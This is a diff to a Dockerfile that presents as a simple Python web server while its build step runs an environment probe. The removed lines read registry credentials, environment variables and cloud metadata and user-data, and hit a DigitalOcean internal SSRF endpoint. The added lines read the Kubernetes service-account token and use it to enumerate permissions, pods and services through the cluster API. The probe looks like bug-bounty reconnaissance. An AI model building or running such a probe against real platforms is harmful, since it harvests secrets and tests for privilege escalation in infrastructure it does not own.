@@ -2,17 +2,18 @@ FROM ubuntu:24.04
 ENV DEBIAN_FRONTEND=noninteractive
 RUN apt-get update -qq && apt-get install -y -qq --no-install-recommends curl python3 ca-certificates >/dev/null 2>&1 || true
 RUN bash -c 'set -x; \
-  id; uname -a; cat /proc/1/cgroup; head -3 /proc/self/status; \
-  echo "--- caps"; grep -E "Cap(Eff|Prm|Bnd)" /proc/self/status; \
-  echo "--- mounts"; cat /proc/mounts | head -40; \
-  echo "--- sockets"; ls -la /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /run/buildkit/buildkitd.sock 2>&1; \
-  echo "--- docker cfg"; ls -la /root/.docker /kaniko /workspace 2>&1; cat /root/.docker/config.json 2>/dev/null | sed -E "s/(\"auth\":\s*\")[^\"]+/\1REDACTED/"; \
-  echo "--- env"; env | sort | sed -E "s/^([A-Za-z0-9_]+)=.*/\1=SET/"; \
-  echo "--- resolv"; cat /etc/resolv.conf; cat /etc/hosts; \
-  echo "--- meta"; curl -sS --max-time 5 http://169.254.169.254/metadata/v1.json || echo META_FAIL; \
-  echo "--- userdata"; curl -sS --max-time 5 http://169.254.169.254/metadata/v1/user-data || echo USERDATA_FAIL; \
-  echo "--- sheriff"; curl -sS -k --max-time 5 "https://ssrf-sheriff.internal.digitalocean.com/?u=bb" || echo SHERIFF_FAIL; \
-  echo "--- api"; curl -sS --max-time 5 https://api.digitalocean.com/v2/account -o /dev/null -w "%{http_code}\n" || echo API_FAIL; \
+  id; uname -a; cat /proc/1/cgroup; grep -E "Cap(Eff|Prm|Bnd)" /proc/self/status; \
+  echo "--- sa"; ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>&1; \
+  SA=/var/run/secrets/kubernetes.io/serviceaccount; \
+  if [ -f $SA/token ]; then \
+    NS=$(cat $SA/namespace); echo "SA_NS=$NS"; \
+    TOKEN=$(cat $SA/token); echo "TOKEN_LEN=${#TOKEN}"; \
+    echo "--- claims"; cut -d. -f2 $TOKEN | tr "_-" "/+" | base64 -d 2>/dev/null; echo; \
+    echo "--- version"; curl -sk --max-time 6 -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/version; echo; \
+    echo "--- rules"; curl -sk --max-time 6 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}" https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews; echo; \
+    echo "--- pods"; curl -sk --max-time 6 -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc/api/v1/namespaces/$NS/pods?limit=5"; echo; \
+    echo "--- svc"; curl -sk --max-time 6 -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc/api/v1/namespaces/$NS/services?limit=5"; echo; \
+  else echo NO_SA_TOKEN; fi; \
   echo "--- probe done"; true'
 CMD ["python3","-m","http.server","8080"]
 EXPOSE 8080
